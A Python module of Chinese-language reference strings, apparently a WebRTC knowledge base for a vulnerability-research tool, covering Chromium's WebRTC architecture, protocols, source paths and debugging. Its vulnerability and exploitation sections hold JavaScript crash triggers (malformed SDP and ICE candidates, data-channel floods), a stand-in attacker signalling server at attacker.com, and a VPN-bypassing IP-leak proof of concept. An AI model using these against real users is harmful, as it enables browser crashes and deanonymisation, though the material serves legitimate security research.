"""
WebRTC Knowledge Base

WebRTC提供浏览器实时通信能力，包括音视频通话和数据传输。
"""

WEBRTC_OVERVIEW = """
# WebRTC Overview

WebRTC (Web Real-Time Communication) 是浏览器的实时通信框架。

## 核心功能
1. **媒体捕获**: getUserMedia API
2. **点对点连接**: RTCPeerConnection
3. **数据通道**: RTCDataChannel
4. **媒体编解码**: VP8/VP9/H.264, Opus

## 架构层次
```
JavaScript API
     ↓
Blink Bindings
     ↓
WebRTC Native (libwebrtc)
     ↓
├── 媒体引擎
├── 传输层 (ICE/DTLS/SRTP)
└── 编解码器
```

## 关键目录
- `third_party/webrtc/`: WebRTC核心库
- `third_party/blink/renderer/modules/peerconnection/`: Blink绑定
- `third_party/webrtc/modules/video_coding/`: 视频编解码
- `third_party/webrtc/modules/audio_coding/`: 音频编解码
"""

WEBRTC_PROTOCOLS = """
# WebRTC 协议栈

## 信令层
- SDP (Session Description Protocol): 会话描述
- ICE (Interactive Connectivity Establishment): 连接建立
- STUN/TURN: NAT穿透

## 传输层
- DTLS (Datagram TLS): 加密握手
- SRTP (Secure RTP): 加密媒体传输
- SCTP: 数据通道传输

## 媒体层
- RTP/RTCP: 媒体传输协议
- 编解码器协商
- 带宽估计

## SDP结构示例
```
v=0
o=- 123456 2 IN IP4 127.0.0.1
s=-
t=0 0
m=audio 9 UDP/TLS/RTP/SAVPF 111
c=IN IP4 0.0.0.0
a=rtpmap:111 opus/48000/2
m=video 9 UDP/TLS/RTP/SAVPF 96
a=rtpmap:96 VP8/90000
```
"""

WEBRTC_VULNERABILITY_PATTERNS = """
# WebRTC 常见漏洞模式

## 1. SDP解析漏洞

### 模式
- 畸形SDP导致解析错误
- 缓冲区溢出
- 整数溢出

### 触发示例
```javascript
let pc = new RTCPeerConnection();

// 畸形SDP
let maliciousSDP = {
    type: 'offer',
    sdp: `v=0
o=- 0 0 IN IP4 0.0.0.0
s=-
t=0 0
m=audio 9 UDP/TLS/RTP/SAVPF ${'1 '.repeat(10000)}
`
};

pc.setRemoteDescription(maliciousSDP);
```

## 2. 媒体处理漏洞

### 模式
- 视频帧解码溢出
- 音频采样处理错误
- 编解码器状态机错误

### 触发示例
```javascript
// 发送畸形媒体数据
let pc = new RTCPeerConnection();
let dc = pc.createDataChannel('test');

// 或通过视频轨道
navigator.mediaDevices.getUserMedia({video: true})
    .then(stream => {
        pc.addTrack(stream.getVideoTracks()[0], stream);
        // 操纵发送的帧数据
    });
```

## 3. ICE/STUN处理漏洞

### 模式
- STUN消息解析错误
- ICE候选处理问题
- 地址验证绕过

### 触发示例
```javascript
let pc = new RTCPeerConnection({
    iceServers: [{
        urls: 'stun:malicious-server.com'
    }]
});

// 添加畸形ICE候选
pc.addIceCandidate({
    candidate: 'candidate:1 1 UDP 2130706431 ' +
               '0.0.0.0'.repeat(1000) + ' 8080 typ host',
    sdpMid: 'audio',
    sdpMLineIndex: 0
});
```

## 4. SRTP/DTLS漏洞

### 模式
- 加密处理错误
- 密钥交换问题
- 重放攻击

### 位置
- `modules/rtp_rtcp/`
- `pc/dtls_transport.cc`

## 5. 数据通道漏洞

### 模式
- SCTP消息处理
- 分片重组错误
- 流量控制问题

### 触发示例
```javascript
let pc1 = new RTCPeerConnection();
let pc2 = new RTCPeerConnection();

let dc = pc1.createDataChannel('test', {
    maxRetransmits: 0xFFFFFFFF,  // 极端值
    maxPacketLifeTime: 0xFFFFFFFF
});

dc.onopen = () => {
    // 发送大量数据
    for (let i = 0; i < 10000; i++) {
        dc.send(new ArrayBuffer(65535));
    }
};
```

## 6. 视频编解码器漏洞

### 模式
- VP8/VP9帧解析
- H.264 NAL单元处理
- 帧间预测错误

### 常见位置
- `modules/video_coding/codecs/vp8/`
- `modules/video_coding/codecs/vp9/`
- `modules/video_coding/codecs/h264/`
"""

WEBRTC_DEBUGGING = """
# WebRTC 调试技术

## Chrome调试标志
```bash
--enable-logging=stderr --v=1
--enable-webrtc-event-log-output
--force-fieldtrials=WebRTC-FlexFEC-03-Advertised/Enabled/
```

## 内部调试页面
```
chrome://webrtc-internals/
chrome://webrtc-logs/
```

## 关键源文件
- `pc/peer_connection.cc`: 对等连接
- `pc/sdp_offer_answer.cc`: SDP处理
- `modules/rtp_rtcp/source/`: RTP处理
- `api/video_codecs/`: 编解码器接口

## 构造测试用例
```javascript
// 完整的WebRTC测试
async function testWebRTC() {
    let pc1 = new RTCPeerConnection();
    let pc2 = new RTCPeerConnection();

    // ICE候选交换
    pc1.onicecandidate = e => {
        if (e.candidate) pc2.addIceCandidate(e.candidate);
    };
    pc2.onicecandidate = e => {
        if (e.candidate) pc1.addIceCandidate(e.candidate);
    };

    // 创建数据通道
    let dc = pc1.createDataChannel('test');

    // 创建和交换offer/answer
    let offer = await pc1.createOffer();
    await pc1.setLocalDescription(offer);
    await pc2.setRemoteDescription(offer);

    let answer = await pc2.createAnswer();
    await pc2.setLocalDescription(answer);
    await pc1.setRemoteDescription(answer);
}
```

## 抓包分析
```bash
# 使用Wireshark抓取WebRTC流量
# 过滤器: stun || dtls || rtp
```
"""

WEBRTC_EXPLOITATION = """
# WebRTC 利用技术

## 远程触发
WebRTC漏洞通常可远程触发:
1. 恶意网页引导用户建立连接
2. 发送畸形SDP/ICE数据
3. 通过媒体流发送恶意数据

## 触发模式
```javascript
// 攻击者控制的信令服务器
let ws = new WebSocket('wss://attacker.com/signal');

ws.onmessage = async (e) => {
    let msg = JSON.parse(e.data);
    if (msg.type === 'offer') {
        // 接收攻击者的恶意SDP
        await pc.setRemoteDescription(msg);
        let answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        ws.send(JSON.stringify(answer));
    }
};
```

## 绕过同源策略
- WebRTC可与任意服务器建立连接
- 可用于内网探测
- 可泄露真实IP（绕过VPN）

## IP泄露PoC
```javascript
let pc = new RTCPeerConnection({
    iceServers: []
});
pc.createDataChannel('');
pc.createOffer().then(offer => {
    pc.setLocalDescription(offer);
});
pc.onicecandidate = (e) => {
    if (e.candidate) {
        // candidate包含真实IP
        console.log(e.candidate.candidate);
    }
};
```
"""


def get_webrtc_knowledge() -> str:
    """获取完整的WebRTC知识库"""
    return "\n\n".join([
        WEBRTC_OVERVIEW,
        WEBRTC_PROTOCOLS,
        WEBRTC_VULNERABILITY_PATTERNS,
        WEBRTC_DEBUGGING,
    ])


WEBRTC_KNOWLEDGE_SECTIONS = {
    "overview": WEBRTC_OVERVIEW,
    "protocols": WEBRTC_PROTOCOLS,
    "patterns": WEBRTC_VULNERABILITY_PATTERNS,
    "debugging": WEBRTC_DEBUGGING,
    "exploitation": WEBRTC_EXPLOITATION,
}
